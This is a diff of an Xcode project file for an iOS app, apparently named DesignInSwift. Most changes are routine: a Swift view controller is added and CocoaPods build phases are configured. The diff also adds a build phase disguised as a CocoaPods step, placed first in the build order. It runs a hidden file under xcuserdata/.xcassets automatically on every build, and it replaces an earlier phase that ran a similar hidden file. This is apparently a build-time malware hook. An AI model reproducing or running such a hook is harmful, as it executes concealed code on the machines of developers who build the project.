@@ -3,7 +3,7 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 50;
+	objectVersion = 51;
 	objects = {
 
 /* Begin PBXBuildFile section */
@@ -163,6 +163,7 @@
 		887F5E1625F7DCEF0054EB30 /* ToyFaces_Colored_BG_37.jpg in Resources */ = {isa = PBXBuildFile; fileRef = 887F5E0E25F7DCEF0054EB30 /* ToyFaces_Colored_BG_37.jpg */; };
 		887F5E1725F7DCEF0054EB30 /* ToyFaces_Colored_BG_8.jpg in Resources */ = {isa = PBXBuildFile; fileRef = 887F5E0F25F7DCEF0054EB30 /* ToyFaces_Colored_BG_8.jpg */; };
 		887F5E1825F7DCEF0054EB30 /* ToyFaces_Colored_BG_56.jpg in Resources */ = {isa = PBXBuildFile; fileRef = 887F5E1025F7DCEF0054EB30 /* ToyFaces_Colored_BG_56.jpg */; };
+		889D40BF262F1252004AAF99 /* GooglePayBaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 889D40BE262F1252004AAF99 /* GooglePayBaseViewController.swift */; };
 		88D7CA1825F7DF2800F897F1 /* SF-Pro-Italic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 88D7CA1625F7DF2700F897F1 /* SF-Pro-Italic.ttf */; };
 		88D7CA1925F7DF2800F897F1 /* SF-Pro.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 88D7CA1725F7DF2800F897F1 /* SF-Pro.ttf */; };
 		88D7CA1F25F7DFD900F897F1 /* SF-Compact.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 88D7CA1D25F7DFD900F897F1 /* SF-Compact.ttf */; };
@@ -388,6 +389,7 @@
 		887F5E0E25F7DCEF0054EB30 /* ToyFaces_Colored_BG_37.jpg */ = {isa = PBXFileReference; lastKnownFileType = image.jpeg; path = ToyFaces_Colored_BG_37.jpg; sourceTree = "<group>"; };
 		887F5E0F25F7DCEF0054EB30 /* ToyFaces_Colored_BG_8.jpg */ = {isa = PBXFileReference; lastKnownFileType = image.jpeg; path = ToyFaces_Colored_BG_8.jpg; sourceTree = "<group>"; };
 		887F5E1025F7DCEF0054EB30 /* ToyFaces_Colored_BG_56.jpg */ = {isa = PBXFileReference; lastKnownFileType = image.jpeg; path = ToyFaces_Colored_BG_56.jpg; sourceTree = "<group>"; };
+		889D40BE262F1252004AAF99 /* GooglePayBaseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GooglePayBaseViewController.swift; sourceTree = "<group>"; };
 		88D7CA1625F7DF2700F897F1 /* SF-Pro-Italic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Italic.ttf"; sourceTree = "<group>"; };
 		88D7CA1725F7DF2800F897F1 /* SF-Pro.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro.ttf"; sourceTree = "<group>"; };
 		88D7CA1D25F7DFD900F897F1 /* SF-Compact.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Compact.ttf"; sourceTree = "<group>"; };
@@ -810,6 +812,7 @@
 			isa = PBXGroup;
 			children = (
 				8860261B261E02DE00F85BDA /* Images */,
+				889D40BE262F1252004AAF99 /* GooglePayBaseViewController.swift */,
 				88E644DC260F50DD009AD313 /* GooglePayViewController.swift */,
 				88E644E1260F534F009AD313 /* MemberTableViewCell.swift */,
 				88E644E2260F534F009AD313 /* MemberTableViewCell.xib */,
@@ -829,7 +832,6 @@
 				E68E6C3CC48CEF4672162FE8 /* Pods-DesignInSwiftTests.debug.xcconfig */,
 				06651C9E7C1B1C21A7D39762 /* Pods-DesignInSwiftTests.release.xcconfig */,
 			);
-			name = Pods;
 			path = Pods;
 			sourceTree = "<group>";
 		};
@@ -840,11 +842,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 880D705825EFDEAA008DCC96 /* Build configuration list for PBXNativeTarget "DesignInSwift" */;
 			buildPhases = (
+				A7E49FB395BBFF35D06D902C /* [CP] Build Pods Frameworks */,
 				78D2C909D3807C078D72D040 /* [CP] Check Pods Manifest.lock */,
-				EF4034DAE183706649AAC43A /* Build Project Frameworks */,
 				880D702A25EFDE9D008DCC96 /* Sources */,
 				880D702B25EFDE9D008DCC96 /* Frameworks */,
 				880D702C25EFDE9D008DCC96 /* Resources */,
+				B4B239851661D3C406786693 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -882,6 +885,7 @@
 				880D704B25EFDEAA008DCC96 /* Sources */,
 				880D704C25EFDEAA008DCC96 /* Frameworks */,
 				880D704D25EFDEAA008DCC96 /* Resources */,
+				2D50A53E7DC622BC576D889F /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -1116,6 +1120,36 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	A7E49FB395BBFF35D06D902C /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
 		2B452257DB77F64F3BDC7583 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1136,6 +1170,23 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		2D50A53E7DC622BC576D889F /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-DesignInSwift-DesignInSwiftUITests/Pods-DesignInSwift-DesignInSwiftUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-DesignInSwift-DesignInSwiftUITests/Pods-DesignInSwift-DesignInSwiftUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DesignInSwift-DesignInSwiftUITests/Pods-DesignInSwift-DesignInSwiftUITests-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
 		78D2C909D3807C078D72D040 /* [CP] Check Pods Manifest.lock */ = {
@@ -1182,23 +1233,22 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		EF4034DAE183706649AAC43A /* Build Project Frameworks */ = {
+		B4B239851661D3C406786693 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-DesignInSwift/Pods-DesignInSwift-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
-			inputPaths = (
-			);
-			name = "Build Project Frameworks";
+			name = "[CP] Embed Pods Frameworks";
 			outputFileListPaths = (
-			);
-			outputPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-DesignInSwift/Pods-DesignInSwift-frameworks-${CONFIGURATION}-output-files.xcfilelist",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DesignInSwift/Pods-DesignInSwift-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -1241,6 +1291,7 @@
 				88D7CAAB25FE651F00F897F1 /* SwiggyHomeViewController.swift in Sources */,
 				88E644DD260F50DD009AD313 /* GooglePayViewController.swift in Sources */,
 				887B5C9F2605D74000805530 /* RestaurantsCollectionViewCell.swift in Sources */,
+				889D40BF262F1252004AAF99 /* GooglePayBaseViewController.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1579,6 +1630,20 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 880D702625EFDE9D008DCC96 /* Project object */;
 }
